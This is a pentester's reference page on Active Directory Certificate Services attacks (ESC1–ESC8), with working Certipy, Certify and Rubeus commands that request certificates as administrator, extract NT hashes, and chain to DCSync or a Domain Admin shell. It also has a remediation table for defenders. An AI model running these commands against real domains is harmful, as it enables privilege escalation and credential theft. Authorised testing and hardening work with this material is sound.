# ADCS Attacks - Active Directory Certificate Services

---

## What Is ADCS and Why Does It Matter?

**Active Directory Certificate Services** is Microsoft's PKI (Public Key Infrastructure) built into Windows domains. It issues **digital certificates** - cryptographic ID cards that prove who you are.

In an AD environment, certificates are used for:
- User/computer authentication (log in with a cert instead of a password)
- Smart card login
- Encrypting email, signing code
- VPN authentication

**Why attackers love it:** A certificate that lets you authenticate as a user does not expire when the user changes their password. If you get a cert for Domain Admin, you can authenticate as DA even after the password rotates - and the cert might be valid for a year.

---

## Key Concepts

### Certificate Templates
Templates define the rules for certificates: who can request one, what it is valid for, how long it lasts.

### Enrollment
"Enrollment" = requesting a certificate.

### Subject Alternative Name (SAN)
A SAN is an extra field in a certificate that says "this cert is also valid for this other identity." If a template lets you specify your own SAN, you can request a cert that says you are anyone in the domain - including Domain Admin.

### Finding the Enterprise CA
```sh
# From Linux
certipy find -u user@corp.local -p pass -dc-ip <DC-IP>
```

---

## Finding Vulnerable Templates (Always Do This Step)

```sh
# Certipy - enumerate all templates and flag vulnerable ones
certipy find -u user@corp.local -p pass -dc-ip <DC-IP> -vulnerable -stdout

# With hash instead of password
certipy find -u user@corp.local -hashes :<NT-hash> -dc-ip <DC-IP> -vulnerable -stdout
```

Certipy outputs a summary of each vulnerable template with the ESC number. That tells you exactly which attack applies.

---

## Privileges Required (per ESC)

| Step | Privilege | Why |
|---|---|---|
| **Enumerate templates** (`certipy find`) | **Any authenticated domain user** | LDAP read on the Configuration NC is granted to all authed users |
| **[ESC1](esc1.md)** (SAN abuse) | Enrollment rights on the vulnerable template (often granted to broad groups like Domain Users) | The misconfig (`ENROLLEE_SUPPLIES_SUBJECT` + low-priv enrollment) IS the privesc |
| **[ESC2](esc2.md)** (any-purpose EKU) | Enrollment rights on the template | Same low-priv enrollment idea - cert's EKU lets you use it for any purpose |
| **[ESC3](esc3.md)** (Enrollment Agent abuse) | Enrollment rights on the Enrollment Agent template | EA cert grants "request on behalf of" any user |
| **[ESC4](esc4.md)** (template ACL abuse) | **Write permission** on a certificate template (often via group nesting / forgotten ACLs) | You don't exploit a misconfig - you *create one* by writing a vulnerable EKU/flag to the template |
| **[ESC6](esc6.md)** (CA-wide SAN flag) | Enrollment rights on **any** client-auth template - the flaw is on the CA, not the template | `EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA lets any request supply a SAN |
| **[ESC7](esc7.md)** (CA ACL abuse) | `ManageCA` or `ManageCertificates` on the CA object | You approve your own denied request or grant yourself officer rights to do so |
| **[ESC8](esc8.md)** (NTLM relay -> web enrollment) | **A position to coerce + relay** - your account can be unprivileged | The relayed identity is a *machine account* (often the DC) coerced via PetitPotam/PrinterBug |
| **Request the cert** (`certipy req`) | Whatever the template requires (rows above) | Normal AD enrollment activity |
| **Authenticate with the cert** (`certipy auth`) | **None** | Cert *is* the credential - returns a TGT + NTLM hash |

**Get there:** ADCS is unusually generous - most ESCs work from **any authenticated domain user** as long as the template misconfig already exists. The privesc lives in the template, not your account. Always run `certipy find -vulnerable` early. For ESC8 specifically, you need a [relay position](../../initial-access/smb-relay.md) (Responder + ntlmrelayx on the network) and a coercion primitive (PetitPotam, PrinterBug - covered in the relay note). For ESC4 you need write rights on a template, which often comes from [ACL Abuse](../acl-abuse.md) paths visible in [BloodHound](../../enumeration/bloodhound.md).

---

## Full Attack Flow Summary

```
certipy find -> identify ESC number
    v
ESC1/2: certipy req -upn administrator -> administrator.pfx
ESC3:   req agent cert -> req on-behalf-of DA -> administrator.pfx
ESC4:   modify template -> ESC1 attack -> restore template
ESC6:   req against ANY client-auth template with -upn
ESC7:   add-officer -> enable SubCA -> req -> issue-request -> retrieve
ESC8:   coerce -> relay to /certsrv/certfnsh.asp -> cert as DC
    v
certipy auth -pfx administrator.pfx
    -> NT hash for administrator
    v
nxc / secretsdump / evil-winrm with hash
    -> Domain Admin shell / DCSync
```

See also: **[Certifried (CVE-2022-26923)](certifried.md)** - machine-account rename to impersonate a DC.

---

## When to Check for ADCS

- Any time you get domain credentials
- Run `certipy find -vulnerable` immediately after BloodHound collection
- Takes 10 seconds to check - worth running on every AD engagement

---

## Certipy Quick Reference

```sh
# Enumerate (always run this)
certipy find -u user@corp.local -p pass -dc-ip <DC-IP> -vulnerable -stdout

# Request a cert (ESC1/2)
certipy req -u user@corp.local -p pass -dc-ip <DC-IP> -ca <CA-NAME> -template <TEMPLATE> -upn administrator@corp.local

# Authenticate with cert -> get NT hash
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>

# If PKINIT fails (old DC or no Kerberos cert support) - use LDAP instead
certipy auth -pfx administrator.pfx -dc-ip <DC-IP> -ldap-shell

# With hash auth
certipy find -u user@corp.local -hashes :<NT-hash> -dc-ip <DC-IP> -vulnerable
```

---

## Windows Tooling: Certify.exe + Rubeus

Certipy is the Linux/Impacket toolchain. On a Windows foothold, use **Certify.exe** (GhostPack) for enumeration + cert requests and **Rubeus** for PKINIT authentication. Same attacks, different binaries.

```powershell
# Enumerate all templates + CAs
Certify.exe find

# Only vulnerable templates
Certify.exe find /vulnerable

# Just what the current user can enroll in (fast triage)
Certify.exe find /vulnerable /currentuser

# List CAs and their permissions (useful for ESC7)
Certify.exe cas

# Request a cert (ESC1/2/6 - see per-ESC pages for the /altname value)
Certify.exe request /ca:CA-HOST\CORP-CA /template:<TEMPLATE> /altname:administrator

# PKINIT auth with the resulting base64 PFX - returns a TGT + (via /getcredentials) NT hash
Rubeus.exe asktgt /user:administrator /certificate:<base64-pfx> /password:<pfx-pass> /nowrap /getcredentials
```

Notes:
- Certify covers **ESC1, ESC2, ESC3, ESC6**. ESC4 template writes need **StandIn** or PowerView. ESC7 CA-officer manipulation needs **PSPKI**. ESC8 relay is ntlmrelayx-based (Linux).
- Certify prints the PFX as base64 you pipe straight into Rubeus - no file needed.
- `Rubeus.exe /getcredentials` triggers **UnPAC-the-hash** so you get an NT hash out alongside the TGT.

---

## Working with .pfx Files

Certipy hands you a `.pfx` (PKCS#12 blob = cert + private key). Most tools want it that way, but some want a raw PEM cert + key. Handy conversions:

```sh
# Extract the certificate (public part) as PEM
openssl pkcs12 -in cert.pfx -nokeys -out cert.pem -password pass:

# Extract the private key as PEM
openssl pkcs12 -in cert.pfx -nocerts -nodes -out cert.key -password pass:

# Both at once (cert + key in one PEM file)
openssl pkcs12 -in cert.pfx -nodes -out combined.pem -password pass:

# Combine a PEM cert + PEM key back into a .pfx
openssl pkcs12 -export -in cert.pem -inkey cert.key -out cert.pfx -password pass:

# Strip / change the .pfx password
openssl pkcs12 -in cert.pfx -nodes -out tmp.pem -password pass:oldpw
openssl pkcs12 -export -in tmp.pem -out cert.pfx -password pass:newpw
```

Notes:
- Certipy writes .pfx with an **empty password** by default. Pass `-password pass:` to openssl (empty after the colon).
- Certipy has built-in conversion too: `certipy cert -pfx cert.pfx -nokey -out cert.crt` and `certipy cert -pfx cert.pfx -nocert -out cert.key`.
- Base64-encode a .pfx for tools that take it inline (Rubeus, Whisker output): `base64 -w0 cert.pfx`.

---

## Remediation (For Report Writing)

**Root cause:** Certificate templates are complex to configure correctly. Custom templates created for specific use cases are frequently misconfigured - especially the "Enrollee Supplies Subject" setting.

| Finding | Remediation |
|---|---|
| ESC1 - Enrollee supplies subject | Disable **"Supply in the request"** in the template's Subject Name tab. Instead set it to "Build from Active Directory information." |
| ESC2 - No EKU or Any Purpose | Set specific EKUs appropriate for the template's purpose. Remove the "Any Purpose" EKU. |
| ESC3 - Enrollment agent template | Restrict who can enroll in the Certificate Request Agent template. Enable **CA Manager Approval** to require manual sign-off. |
| ESC4 - Write permissions on template | Only Domain Admins / CA admins should have write access to templates. |
| ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 | Remove the flag: `certutil -config <CA> -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2` and restart the CA. |
| ESC7 - Vulnerable CA ACL | Audit CA-object ACLs. Only Enterprise Admins / CA Admins should hold `ManageCA` or `ManageCertificates`. |
| ESC8 - Web enrollment NTLM relay | Disable **NTLM authentication** on the CA web enrollment endpoint. Enforce HTTPS + Extended Protection for Authentication (EPA). |
| General ADCS hardening | Run **certipy find** as a regular audit tool. Enable **CA Audit logging** (`certutil -setreg CA\AuditFilter 127`). Review Event ID 4886 logs for anomalous requests. |

**Key point for reports:** ADCS vulnerabilities are particularly impactful because certificates persist beyond password changes - a cert valid for 1 year gives an attacker 1 year of persistent access regardless of remediation. Always recommend revoking any suspect certificates immediately.

---

## Why certipy auth Gives You a Hash

When you authenticate with a certificate, Certipy uses **PKINIT** - a Kerberos extension that lets you log in with a cert instead of a password. The DC returns a TGT. Certipy then uses a technique called **UnPAC-the-hash** to extract the NT hash from the TGT's PAC structure. This is why you get a usable NT hash at the end - not just a Kerberos ticket.
